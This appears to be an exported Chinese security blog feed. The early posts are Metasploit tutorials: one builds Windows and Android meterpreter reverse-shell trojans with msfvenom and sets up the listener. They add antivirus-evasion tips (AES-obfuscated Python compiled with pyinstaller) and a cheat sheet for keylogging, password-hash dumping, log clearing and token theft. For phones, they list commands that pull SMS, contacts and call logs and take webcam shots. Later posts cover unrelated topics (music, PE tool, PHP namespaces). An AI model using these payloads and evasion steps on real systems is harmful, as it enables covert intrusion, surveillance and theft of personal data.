<p>以下为kali-linux-2.0系统下的生成与连接方式（使用msfvenom命令的）<br><a href="http://www.77169.com/hack/201602/224112.shtm">参考文献一</a><br><a href="http://www.i0day.com/1173.html">类似文献二</a></p>
<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;你的ip LPORT&#x3D;你的端口 -f exe -o payload.exe</p>
<p>以上就是基本命令，解释一下，-p后面是payload名称，然后是你的ip和端口(payload参数)，然后是-f 格式，由于是实验就先设置exe，然后-o payload.exe指保存为payload.exe。当然，实验的时候可以把格式设置成exe，但是实战的时候毕竟有杀毒软件，所以格式最好是jar，jar就要求对方有java环境，可以用来拿java web网站的时候使用，或者设置成python然后自行shellcode免杀，即用Python容器，然后用AES混淆Python代码，再用pyinstaller编译exe，这是目前最完美的过杀毒软件方案，就连勒索软件都不会被杀毒软件干掉，除非有特殊动作，比如修改注册表。当然，楼主还有很多要学习。</p>
<p>具体步骤如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=44444 -f exe -o test.exe            </span><br></pre></td></tr></table></figure>
<p>–&gt;在当前目录下生成木马程序test.exe，PS：生成payload.exe不会被杀，test.exe被秒杀</p>
<p>PS:之后的操作步骤是和上面的一样的↓</p>
<p>之后在metasploit下连接后门程序，步骤如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole                  --&gt;开启metasploit</span><br><span class="line">use exploit/multi/handler       --&gt;使用“exploit/multi/handler”这个模块连接后门程序</span><br><span class="line">show options   --&gt;查看需要设置的配置信息//这里其实不需要配置任何信息的</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp    --&gt;使用tcp反向连接</span><br><span class="line">show options               --&gt;查看需要设置的配置信息</span><br><span class="line"><span class="built_in">set</span> LHOST=192.168.2.146    --&gt;设置我们攻击者自己的连接IP</span><br><span class="line"><span class="built_in">set</span> LPORT=44444            --&gt;设置我们攻击浙自己的连接端口</span><br><span class="line">exploit                    --&gt;执行连接，等待木马执行后连接</span><br></pre></td></tr></table></figure>

<p>PS：远程木马被执行后接着可以直接“shell”命令拿下shell</p>
<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;<br>OK，完成了！<br>&amp;nbsp;<br>&amp;nbsp;</p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>msfvenom</tag>
        <tag>远程木马攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit工具Meterpreter的命令速查表</title>
    <url>/post/Metasploit2/</url>
    <content><![CDATA[<p>&amp;nbsp;<br>&amp;nbsp;</p>
<h4 id="msfpayload反弹shell使用的一些命令集"><a href="#msfpayload反弹shell使用的一些命令集" class="headerlink" title="msfpayload反弹shell使用的一些命令集"></a><font face="楷体">msfpayload反弹shell使用的一些命令集</font></h4><p>&amp;nbsp;</p>
<h5 id="一、核心命令-–-帮助菜单"><a href="#一、核心命令-–-帮助菜单" class="headerlink" title="一、核心命令 – 帮助菜单"></a>一、核心命令 – 帮助菜单<font face="Arail"></h5><blockquote>
<blockquote>
<p><font color="#dd0000">background</font> – 将当前会话移动到背景变成一个session，当再次使用时再用sessions -i ID调用<br>bgkill – 杀死一个背景 meterpreter 脚本<br>bglist – 提供所有正在运行的后台脚本的列表<br>bgrun – 作为一个后台线程运行脚本<br>channel – 显示活动频道<br>close – 关闭通道<br>exit – 终止 meterpreter 会话<br>help – 帮助菜单<br>interact – 与通道进行交互<br>irb – 进入 Ruby 脚本模式<br><font color="#dd0000">migrate</font> – 移动到一个指定的 PID 的活动进程<br>quit – 终止 meterpreter 会话<br>read – 从通道读取数据<br><font color="#dd0000">run</font> – 执行以后它选定的 meterpreter 脚本<br>use – 加载 meterpreter 的扩展<br>write – 将数据写入到一个通道<br></font></p>
</blockquote>
</blockquote>
<h4 id="二、文件系统命令"><a href="#二、文件系统命令" class="headerlink" title="二、文件系统命令"></a><font color="#dd0000">二、文件系统命令</font><font face="Arail"></h4><blockquote>
<blockquote>
<p>cat -读取并输出到标准输出文件的内容<br>cd -更改目录对受害人<br>del -删除文件对受害人<br>download-从受害者系统文件下载<br>edit-用 vim编辑文件<br>getlwd -打印本地目录<br>getwd -打印工作目录<br>lcd -更改本地目录<br>lpwd -打印本地目录<br>ls -列出在当前目录中的文件列表<br>mkdir -在受害者系统上的创建目录<br>pwd -输出工作目录<br>rm -删除文件<br>rmdir -受害者系统上删除目录<br>upload-从攻击者的系统往受害者系统上传文件<br></font></p>
</blockquote>
</blockquote>
<h4 id="三、网络命令"><a href="#三、网络命令" class="headerlink" title="三、网络命令"></a>三、网络命令<font face="Arail"></h4><blockquote>
<blockquote>
<p>portfwd -端口转发<br>route -查看或修改受害者路由表<br></font></p>
</blockquote>
</blockquote>
<h4 id="四、系统命令"><a href="#四、系统命令" class="headerlink" title="四、系统命令"></a>四、系统命令<font face="Arail"></h4><blockquote>
<blockquote>
<p>clearav -清除了受害者的计算机上的事件日志<br>drop_token -被盗的令牌<br>execute-执行命令<br>getpid -获取当前进程 ID (PID)<br>getprivs -尽可能获取尽可能多的特权<br>getuid -获取作为运行服务器的用户<br>kill -终止指定 PID 的进程<br><font color="#dd0000">ps</font> -列出正在运行的进程<br>reboot-重新启动受害人的计算机<br>reg -与受害人的注册表进行交互<br>rev2self -在受害者机器上调用 RevertToSelf()<br><font color="#dd0000">shell</font> -在受害者计算机上打开一个shell<br>shutdown-关闭了受害者的计算机<br>steal_token -试图窃取指定的 (PID) 进程的令牌<br>sysinfo -获取有关受害者计算机操作系统和名称等的详细信息<br></font></p>
</blockquote>
</blockquote>
<h5 id="五、用户界面命令"><a href="#五、用户界面命令" class="headerlink" title="五、用户界面命令"></a>五、用户界面命令<font face="Arail"></h5><blockquote>
<blockquote>
<p>enumdesktops -列出所有可访问台式机<br>getdesktop -获取当前的 meterpreter 桌面<br>idletime -检查长时间以来，受害者系统空闲进程<br>keyscan_dump -键盘记录软件的内容转储<br>keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件<br>keyscan_stop -停止键盘记录软件<br>screenshot-抓去 meterpreter 桌面的屏幕截图<br>set_desktop -更改 meterpreter 桌面<br>uictl -启用用户界面组件的一些控件<br></font></p>
</blockquote>
</blockquote>
<h4 id="六、特权升级命令"><a href="#六、特权升级命令" class="headerlink" title="六、特权升级命令"></a>六、特权升级命令<font face="Arail"></h4><blockquote>
<blockquote>
<p>getsystem -获得系统管理员权限<br></font></p>
</blockquote>
</blockquote>
<h4 id="七、密码转储命令"><a href="#七、密码转储命令" class="headerlink" title="七、密码转储命令"></a>七、密码转储命令<font face="Arail"></h4><blockquote>
<blockquote>
<p>hashdump -抓去哈希密码 (SAM) 文件中的值<br></font></p>
</blockquote>
</blockquote>
<h4 id="八、Timestomp-命令"><a href="#八、Timestomp-命令" class="headerlink" title="八、Timestomp 命令"></a>八、Timestomp 命令<font face="Arail"></h4><blockquote>
<blockquote>
<p>timestomp -操作修改，访问，并创建一个文件的属性<br></font></p>
</blockquote>
</blockquote>
<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>远程木马攻击</tag>
        <tag>Meterpreter命令</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit之渗透安卓实战</title>
    <url>/post/Metasploit3/</url>
    <content><![CDATA[<p>&amp;nbsp;<br>&amp;nbsp;</p>
<h4 id="Metasploit之渗透安卓实战"><a href="#Metasploit之渗透安卓实战" class="headerlink" title="Metasploit之渗透安卓实战"></a><font face="楷体">Metasploit之渗透安卓实战</font></h4><table><tr><td bgcolor=#D1EEEE>&emsp;在之前的Metaspoloit使用中都是在Windows系统中，因为渗透的是Windows系统，所以选用了“windows/meterpreter/reverse_tcp”模块。
而这里需要渗透安卓系统了，就选用“android/meterpreter/reverse_tcp”模块。
那么对于kali-linux连接木马的方式还是和之前的一样，利用“exploit/multi/handler”
并且，同样需要选用“windows/meterpreter/reverse_tcp”的PAYLOAD
这里假设我的测试环境
kali-linux：  192.168.2.146
安卓模拟环境：192.168.2.107</td></tr></table>

<p>&amp;nbsp;</p>
<h5 id="一、生成远程安卓木马"><a href="#一、生成远程安卓木马" class="headerlink" title="一、生成远程安卓木马"></a><font face="楷体">一、生成远程安卓木马</font></h5><table><tr><td bgcolor=#D1EEEE><font color="#dd0000">msfconsole
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=4444 R > payload.apk</font></td></tr></table>

<blockquote>
<blockquote>
<p>命令解析：<br>p 设置要使用的payload<br>LHOST 设置用来接收反弹连接的主机（kali-linux的IP）<br>LPORT 设置用来接收反弹连接的端口（kali-linux的端口）<br>R 设置文件格式<br>Location 要保存的文件位置–&gt;&#x2F;root&#x2F;Desktop&#x2F;是桌面，没有目录表示当前系统Home目录下<br>PS：对于目前的安卓系统安全机制的考虑，因为没有签名证书可能导致无法安装或易被受害者识破<br>那么，签名证书的制作可以查看参考文献资料</p>
</blockquote>
</blockquote>
<p>&amp;nbsp;</p>
<h5 id="二、开启metasploit，并且开启相关连接"><a href="#二、开启metasploit，并且开启相关连接" class="headerlink" title="二、开启metasploit，并且开启相关连接"></a><font face="楷体">二、开启metasploit，并且开启相关连接</font></h5><table><tr><td bgcolor=#D1EEEE><font color="#dd0000">msfconsole
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 192.168.2.146
set LPORT 4444
exploit</font></td></tr></table>

<p>&amp;nbsp;</p>
<h5 id="三、meterpreter连接"><a href="#三、meterpreter连接" class="headerlink" title="三、meterpreter连接"></a><font face="楷体">三、meterpreter连接</font></h5><p><font face="楷体">&amp;emsp;安卓手机安装并且打开木马后会返回我们一个meterpreter连接,那么我们可以使用以下的一些常用的命令:</font></p>
<table><tr><td bgcolor=#D1EEEE><font color="#dd0000">cd               -->目录切换，命令：cd /  切换到根目录
search           -->搜索文件，命令：search text.jpg
download         -->下载文件，命令：download test.jpg
webcam_list      -->查看摄像头列表，因为手机都是前置和后置摄像头了
webcam_snap      -->拍照一张，需要选用前置或者后置摄像头，命令：webcam_snap -i 1
webcam_stream    -->开启摄像头视频监控，同上，命令：webcam_stream -i 1</font>
<font color="#dd0000">安卓系统相关命令：
check_root       -->查看当前安卓是否已经root
dump_calllog     -->下载通话记录
dump_contacts    -->下载短信记录
dump_sms         -->下载通讯录
geolocate        -->利用谷歌地图定位（需要安装谷歌地图）</font></td></tr></table>

<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>远程木马攻击</tag>
        <tag>安卓渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Music-Collection</title>
    <url>/post/Music-Collection/</url>
    <content><![CDATA[<p>&amp;nbsp;</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=730 height=550 src="//music.163.com/outchain/player?type=0&id=692893521&auto=0&height=500"></iframe>

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=730 height=450 src="//music.163.com/outchain/player?type=0&id=2197936899&auto=0&height=430"></iframe>

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=730 height=450 src="//music.163.com/outchain/player?type=0&id=2527477789&auto=0&height=430"></iframe>

]]></content>
      <categories>
        <category>音乐</category>
      </categories>
  </entry>
  <entry>
    <title>Network attack and defense</title>
    <url>/post/Network-attack-and-defense/</url>
    <content><![CDATA[<p>(〃￣︶￣)人(￣︶￣〃)</p>
<span id="more"></span>


<br />
<br />




<div class="pdfobject-container" data-target="/pdf/网络攻防实验报告.pdf" data-height="500px"></div>]]></content>
      <categories>
        <category>Network-Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全复习笔记</title>
    <url>/post/Network-security/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="04670f5341627d1d4215b2d0d3bb32d65366591e45dd2230a31e6c4f67345ae7">f2cb6dad3997b265c98f36a97452129cc092e92f124168e062928c4d9cb8fadc7265a9453afb07faedd95f601f88b5ed1bd43ebf6a32fa660dd566db7277d9b5f47eafc10b48d1d4a9e68cd299b324bf9e6ee7ea80ef212afb16080ae73e61ded4e94af719d6f3767a6533129c1ef7d6f8e66a3216597039beb0a827132dbd3b31fb66effeda05b251f69e3b46b28715118c35fd6ca9f5083b1e7a42522515759f2169c295a2dde3990be1b28c4bb2e027e33f4e493529757861890b881ed7636964bff2aa712677550fb5f4a14a263dcf074101c072cdc6b96336a8c759faa77b3811ddf2b7cc1eb1d011d6c468c7279711e7736170e86d0a4cb33c8f95c7f51eb8f69cc3ff2ee1be4e0e62d70e77b4b241f0c76c601ebd242fc057a18fe3fdab9336166c80c6509516f4651ca77f2e24b49e52f9a1a6545fc0f55a05e0bc4025f158d11a676f0bdceb49b9973aea5605ba1c8d8911d3068b426dff9cefce08505b9db67b849f1113de6352b13fe4b963e5bbc88bcbb03d32e58ceba8273c6e9b5ba70dd181ef7041263d9ce77e76be6de8ce80b21fdbf666c91a42e890536a488504f4d99d4aafd08ac5fecf3c0deecdba261652f4780cd6baa2924ed21eca875ad73d8be7d4ba0cd02312df1df79b0df614571c121ce9d5c57fd85f06bf26cb46c92e4bfcde8cda7321a5741b16e4f9f99705053e0e8d6c8c6de10827ce92fb256ce2c1e8d8a260f2487f4cec48c70ee7f0e06c02e3629f6e881cf5cc7fb2662b7c721f1a04375d15a603287c5a7ce5ea3c4a68367314b63c913d6a16d84829fcd64f5afcac2b69e8fc791382ef3fc9a8302ddc47911474054cc647c01e492e4131872e49312d7db37ea1ab1b8babe47bd11306faf9def7c2c3d510a767abea8a79a24086af4756ee7af1053b72aba3c3c6976cb5b64a4e2d64ad2a80dd6da6ca3e7e9dfe3efdcc2081f335b3838765f441e8ede615b2bbaf6b1a71993058fc4eda3f82e50aea5686b8b4080a0f853e4dd9cf756ec40de4b7c15f7d25e00c0cce89934471dbdc03b6c792a1ef1cacbc43368c939ebb76f0030aec4ac9da38e120597505d3e870b27deb2651f3825e98b7f4041d6993e0a89acfb903ff23880c16a68357a9d241ecffa3d486cbb81257dccd8558142dc9cdc2264250f4b1982117c132714a3fccb9d6a573b93963e9022abdbc9ab839213fe013e0a32988b5b20e0221e08cf643a9b9db9db7686ecfbd87b6b0ba30ce64dbee0b4db191f85beb1ca38a851a9669f8f580307147d29cf9d384f594b8531e6ef3f7ae045c69a91a47f91295ed29c904d5ea881284cf7277ca1e689bc84c29ffb371431c79aef45e652d50886017f9dd43fc6e7b865bdf115268f7e0a0ec68002f69af0a86fa0ebf8a6992fb2c62dbe25fd2d3b901ef177a649207e8a83b75e49a5e38f0150eef58c12a884767f23eb156b87f5fd5b831f7d95178eed25c1eafc54fbd997be64357196bed80626fda49fe00a0ce00316341ca5d184ed0191215023ea7d41601fb2a61e63cf48f63d552d039501018983bff3daca827b8faf70a4105b0a88181fd3e7c963d5873b2a0711ac67e3f20cc5ffd6aa1bf0d15a7cd76571d43301b882123cdd155ff4726cb9a53d30023282b419627e1962f6afd2574cacd0168388ba6f710cbd1cd853f7cd17dc35dc92147fb2c360684f37d39d0a8c726dab30757bcc10045654fd0bb25a02b320ff0d2585ed77a33fc481bde3c19dfb206a7fb7054159be8069423afbbad8d9ab9eaf74d9a61b865fe6d00ce79355e0c751f266a5c61b69beec49795670c8ef044e718d47dad42556b4580053fab6dd72642fc5c925d5759cb7820294fac104eba496b4fc21b0d4d16f30f3a4e508360344b05856b5192a9fb57236185bbf8c79c34377dea6fdde82ecdf72bed209f0bb746441f5b1d630d2d5db2e79c30f3e9e38e284a72dcfd30742e1157d42f584a6ddc05cacc84c4982ce745e3e843e72163f6709b8ada02a34bfe4196d6986a9bf8ab29127702bc4c80f506bdccb9f05c53af9516602f03ef3e31238f9be670cfb71c5715a0ca96e12a261e733d79a2e59cc0dc2169f260117dc5beccd61dfb48c058430d8d31d9aa4154eb952f31c1324781e64693684d9ee5e127d1589de1eb20fbca319f643282f1a6dd43d01a0b32b075724d976c38c09e87f72a68ef91658fd03f9667816be4f6f5ca2f045f560e99b2211520739812edf046523c2ae7f6bdc3026dccb8eed9d73c3f79e2b2a64fbb735433574c346a5332323f47643173d1df2015aeb1e1acd06950209f565f68b91ca910722328c33ebce3295a74dd2943649fbb8df90e92123aedd24e54b40aaeaac02a85b424221589c051b360ede7ae77ccef702df03d807f229e285e25b44c76bfdba0a0d8591e10f5654a476cb42491c594843942cc2dd872fb567db22e38d7908054f3100ede08f4ad0747d04302a0675b7798158521385250a1cb1ca59ce487b278be04179f06a18566d8de4fe198eac7ac3caec185cbfab4cb2a72bc3a8659d704925d53142222af52cb22b2866b03119cdc7faa349bdb0763466d0f9b4e5796765850f6dc76644cfc08261b4d33cb445c534900ecd5f85fd935d50dde5b01e00346f34334bffa50fc06fcc3538baf4fdacdedc5b682d35d7a996b8f0e4971bef5a0e413dd7f6eb9f60a4cb6e92563db70a37ab3a835378074cb4338bc1d3de462a47beca0244f38b2a1b4fc9a3edc3b796afb4a1d243e434f335c29f4b51b1c4e1d956fb87aa526de44ed5403e8df1c3bef585324fa66d1ddef9266c019d1cc1c0fb88fc6cfe501220e105d72d891200452e181a4ab4f63b229f3fc63028b14556d8597b6e255c567562e3da9c0bf731f4387b546055fc57cd8f0c9701847a378b7be3ae46c90913649bf6a45c82b4def7f6f143af4af187a489dd5c032e08e25eb121267a69e10de209d2b4cd7398da14465779aad96e650faaddd7603ab2aeee6f9b12a57249622ba26c8befa700595be9c286722738bd1d47e8ba95aca359e86688908fff409d3bc2fdf86bcfcf5078fb67f83df583f95ef1412bf9d65395d287dec3f78a1008fc022a391fb11be74461a6088746d54624da6b6b77743d63c08cbedbe1210a10b1999dafdd487900edb2fff6dbe994c8d926c50197521b6448ca09032f018d2ac4aab310ae877c17d5c4f948f92ba387c7ad194ac6b9fbdc884d3b08a40083e955a8a792edbf87ee9db47da23b921a227bae4e63003849577ed4175b30f3805eafc30393a218061c2f3330bbf58ccb9ff0807b7df9432c7a69b1ac1d9f5839c276a2775e0278ee8ae4820fe9d994a6b530ef5d670026610b4cee086c8ed5ecad3d234f9c33a0fbe20c08b4bd34b729a6b9a4a60c6732e4f7c3b2b6c033a7dfe99432aaebb9286c0f877adeaa166a840353673c0640032c9b688c3ecda73b2e6c5b40c98059b87bdbbd876dcd3868f9da0f2930c53f6101223f10284aa7017652f82e065503ab88c47fec47c9e478cd237c9b6e09264381a51bba2071c98e9309107e6de9a2abe81661c13d6158ee4bea50ce6a222c9ad99827930b2717922e6913a67fca9e8f78a99476dde0ae4ff7b252f3163de25e0d4795bbdaa87bce37224c4e953dbd4b80b867ab67d36cd5a631c9d6d7fa3312fd0cbc0dc1dc49385942cbb9438c9a324352366799ace5cb5890e77bae9435352bdf49937631bd56d4901c4dad07a02789f2fa665f575c9bfcb954f68603aa3e439cd9cea1a58b4d8b05bed63b2beec949c286a99a199c8dffcf7b4b512cd3bc883bb86affaf9389a7b0c29485d9e609aaccb39b03e446ae9e54b5bc075982092befed93b0686a1f3a88746f14ead8b550644957e4f781e61bdc092dcf977977ccbeec87458e080d743a075bc03b62ff30faa6504e6128013ec939902b6e8b4f256ca96c46761a58f143bc833b08d5cb4712930eb8fb29586eb1a7c6dbac13fbb6f86d2c04e329136154c19028f37a01bcf1c1e97900edb717088d7cf58a128da1e46b683d24a49bfa3b2259ac5577141297a09c6507e47ac02e3322dfd9169ce746d68ed0d52a2b70c317480bffff952c9410ded3bc3ae4f8f06763b691e7f48874b5c4668ee510cb27a448e0ea18c7e7fd7272ecb4f17225f739f99a6a756fd0d4dfddfb4a1a34e7870327e16d79791c2e075401ba8220905bfa5cccad200f9782fcdb7498dc5e896797d090fc2491bfa474193e2e64eec182a58d542bbc8bc5f9de4b742875544e28551d6c93a282f847fc2d3e8fa02530f1154345579b3a3eadcb5c1918e815047ed69e73236f3f6fbfe6acbef7d9647cf49df8ffbd06f200d9026707445b557c7181149263c9fee4ec87132245948bbcde1b914efcd4f044b41b7568e016e15907c85a84ee25788db9ed6a5c727707e76e3f9a29b6a53e5aeb74f7e49a018f857de90069067b6f90d24c951e2584c76ff1a689347ba8d2689b452085366b9b3a6b7e255d4c27ab4ac60fd3fcab585199cb39d4a0649d160d6a3ce518316bc21470160fd1b5daf1147f941d58abda29995c4d14d684035345ce3a943eae00d6b9092fdcfbc5a748e79ee7fbe672c1d2b18d41d300859befa97cf0e5940d6b2551fcb1e4416f5362b9937d0553776ed7cd82bec36a70978562045cb18553636075e4cce58bc9b41acc2cad557be3bb70ac2c98467c92cd711fb045692183f335310f95fffb1d07e7ca631d5c06f3087b008f4cf21a9f49ce78351c92324e14060edfe093836389ff9658107428d6ea6006f501a452d8a447176fee10bffb6f21243a00a0aaf0e90d8bdc51492d5aa5ed0185785ecae5e1df4aea7cdc4f789af1b07c5962a16ed2a8c71c3a20bc18f1c7a5c5a37dea48eb2263db2ecf53390ade6c6b8e11d1f42a170b01b70d68e937273bbb2a35939d02b8af74d5145f96b319f38d70e011f7468b7f1cf7119d60e1f0690c2dd27e7e6816401049139f6f65a0d71655a0da9c3182adcc847a17b48dff51100d6bfb9abe4b34cc60664122c1dab1cd4c2067211c2d84be9da7f0b91ff85f1821669881ad4a792412ae6673e3e2697e018219079acec1d04c1a4d1d15b93077143b929aca7517ef61361f6f5b6636711443046302088bc8f8c45cab1bc3b7e1b890cd8c285fcc55b2e3d9b4f448c1e352d3b88eb03703eb2ffb3dc67af3abaef5f150182dc088f6b9aa8269b45abd5d6253e372068dd59d7c5b3369c9d3e1755532c7eab9e9fb7c86e9dca24075c52a99ff56c4727997d21b0b0877e60258168646ff040ed845261b2ed4142bbbdfa4f047a88138f8c663698aed0e2a2aa72e8ae3625725c1bce2eb9b34ab3feb79338d701e67e70ce3747</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>安全笔记</tag>
        <tag>安全指导</tag>
      </tags>
  </entry>
  <entry>
    <title>PE 文件解析及利用工具</title>
    <url>/post/PEView-Tool/</url>
    <content><![CDATA[<p>😄</p>
<span id="more"></span>

<p>（本文包含多张图片，加载较慢，建议挂上VPN或多刷新几次）</p>
<p>为了方便分析恶意样本，自制一些功能，加上对程序进行保护，写了本工具。</p>
<p>工具支持 x86、x64 Windows 平台下可执行文件的解析。</p>
<p>代码量不小，部分功能仍需完善，暂时不计划开源。部分代码如下，包含 C、汇编代码、裸函数使用。</p>
<p><img data-src="https://s2.loli.net/2023/02/25/S1EuabJBwWc9oAq.png" alt="1.png"></p>
<p><img data-src="https://s2.loli.net/2023/02/25/IuBcRsWofmlv3NJ.png" alt="2.png"></p>
<p><img data-src="https://s2.loli.net/2023/02/25/z7wVjCDgyqXsY8e.png" alt="3.png"></p>
<h2 id="1-功能介绍"><a href="#1-功能介绍" class="headerlink" title="1 功能介绍"></a>1 功能介绍</h2><p>工具包涵两个程序，分别是：PE解析及利用工具、特征码提取工具。</p>
<p><img data-src="https://s2.loli.net/2023/02/25/uO2JEx9seYQlTGy.png" alt="5.png"></p>
<h3 id="1-1-版本信息"><a href="#1-1-版本信息" class="headerlink" title="1.1 版本信息"></a>1.1 版本信息</h3><p><img data-src="https://s2.loli.net/2023/02/25/skNStP8XnLVGeMJ.png" alt="4.png"></p>
<h3 id="1-2-PE-信息查看"><a href="#1-2-PE-信息查看" class="headerlink" title="1.2 PE 信息查看"></a>1.2 PE 信息查看</h3><p>能根据识别到的 PE 信息展示可执行文件的路径、执行平台等。</p>
<p><img data-src="https://s2.loli.net/2023/02/25/eI5fHMxwV2Y1GpN.png" alt="6.png"></p>
<h4 id="1-2-1-区段信息"><a href="#1-2-1-区段信息" class="headerlink" title="1.2.1 区段信息"></a>1.2.1 区段信息</h4><p><img data-src="https://s2.loli.net/2023/02/25/7qhWgNB9cRkpmfQ.png" alt="7.png"></p>
<h4 id="1-2-2-数据目录表"><a href="#1-2-2-数据目录表" class="headerlink" title="1.2.2 数据目录表"></a>1.2.2 数据目录表</h4><p><img data-src="https://s2.loli.net/2023/02/25/yhH2xtEmWFNBZMw.png" alt="8.png"></p>
<h4 id="1-2-3-文件偏移-内存偏移转换功能"><a href="#1-2-3-文件偏移-内存偏移转换功能" class="headerlink" title="1.2.3 文件偏移-内存偏移转换功能"></a>1.2.3 文件偏移-内存偏移转换功能</h4><p><img data-src="https://s2.loli.net/2023/02/25/IeRCmKt3SkzAGv6.png" alt="9.png"></p>
<h3 id="1-3-软件加壳"><a href="#1-3-软件加壳" class="headerlink" title="1.3 软件加壳"></a>1.3 软件加壳</h3><p><img data-src="https://s2.loli.net/2023/02/25/avP7Qy2FswOYJHx.png" alt="10.png"></p>
<h3 id="1-4-注入功能"><a href="#1-4-注入功能" class="headerlink" title="1.4 注入功能"></a>1.4 注入功能</h3><p><img data-src="https://s2.loli.net/2023/02/25/GDUdmnVkqg4wfWY.png" alt="11.png"></p>
<h3 id="1-5-进程监控功能"><a href="#1-5-进程监控功能" class="headerlink" title="1.5 进程监控功能"></a>1.5 进程监控功能</h3><p><img data-src="https://s2.loli.net/2023/02/25/2rDkdBYlZmQTfbx.png" alt="12.png"></p>
<h2 id="2-特征码提取工具"><a href="#2-特征码提取工具" class="headerlink" title="2 特征码提取工具"></a>2 特征码提取工具</h2><p><img data-src="https://s2.loli.net/2023/02/25/lhnaO6fwSPp9Wbv.png" alt="13.png"></p>
]]></content>
      <categories>
        <category>PE 文件解析</category>
      </categories>
      <tags>
        <tag>Windows应用层</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-命名空间</title>
    <url>/post/PHP-namespace/</url>
    <content><![CDATA[<p>(oﾟvﾟ)ノ</p>
<span id="more"></span>

<blockquote>
<blockquote>
<p><font color="red">如果没有定义任何命名空间，所有的类与函数的定义都是在全局空间</font>，与 PHP 引入命名空间概念前一样。在名称前加上前缀 \ 表示该名称是全局空间中的名称，即使该名称位于其它的命名空间中时也是如此。对于函数和常量来说，如果当前命名空间中不存在该函数或常量，PHP 会退而使用全局空间中的函数或常量。</p>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<p><font color="#00B2EE"><strong>名称解析遵循下列规则：</strong></font></p>
</blockquote>
</blockquote>
<ol>
<li>对完全限定名称的函数，类和常量的调用在编译时解析。例如 new \A\B 解析为类 A\B。</li>
<li>所有的非限定名称和限定名称（非完全限定名称）根据当前的导入规则在编译时进行转换。例如，如果命名空间 A\B\C 被导入为 C，那么对 C\D\e() 的调用就会被转换为 A\B\C\D\e()。</li>
<li>在命名空间内部，所有的没有根据导入规则转换的限定名称均会在其前面加上当前的命名空间名称。例如，在命名空间 A\B 内部调用C\D\e()，则 C\D\e() 会被转换为 A\B\C\D\e() 。</li>
<li>非限定类名根据当前的导入规则在编译时转换（用全名代替短的导入名称）。例如，如果命名空间 A\B\C 导入为C，则 new C() 被转换为 new A\B\C() 。</li>
<li>在命名空间内部（例如A\B），对非限定名称的函数调用是在运行时解析的。例如对函数 foo() 的调用是这样解析的：<br>(1). 在当前命名空间中查找名为 A\B\foo() 的函数<br>(2). 尝试查找并调用 全局(global) 空间中的函数 foo()。</li>
<li>在命名空间（例如A\B）内部对非限定名称或限定名称类（非完全限定名称）的调用是在运行时解析的。下面是调用 new C() 及 new D\E() 的解析过程： new C()的解析:<br>(1). 在当前命名空间中查找A\B\C类。<br>(2). 尝试自动装载类A\B\C。<blockquote>
<blockquote>
<p><font color="red">new D\E()的解析:</font><br>(1). 在类名称前面加上当前命名空间名称变成：A\B\D\E，然后查找该类。<br>(2). 尝试自动装载类 A\B\D\E。<br>为了引用全局命名空间中的全局类，必须使用完全限定名称 new \C()。</p>
</blockquote>
</blockquote>
</li>
</ol>
<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;</p>
<p><font face="Comic sans MS">对于命名空间，官方文档已经说得很详细<font color="red">[<a href="http://www.php.net/manual/zh/language.namespaces.rationale.php">查看</a>]</font>，我在这里做了一下实践和总结。<br><font color="red">命名空间一个最明确的目的就是解决<strong>重名问题</strong></font>，PHP中不允许两个函数或者类出现相同的名字，否则会产生一个致命的错误。这种情况下只要避免命名重复就可以解决，<font color="red">最常见的一种做法是约定一个前缀</font>。</p>
<p>例：项目中有两个模块：article和message board，它们各自有一个处理用户留言的类Comment。之后我可能想要增加对所有用户留言的一些信息统计功能，比如说我想得到所有留言的数量。这时候调用它们Comment提供的方法是很好的做法，但是同时引入各自的Comment类显然是不行的，代码会出错，在另一个地方重写任何一个Comment也会降低维护性。那这时只能重构类名，我约定了一个命名规则，在类名前面加上模块名，像这样：Article_Comment、MessageBoard_Comment</p>
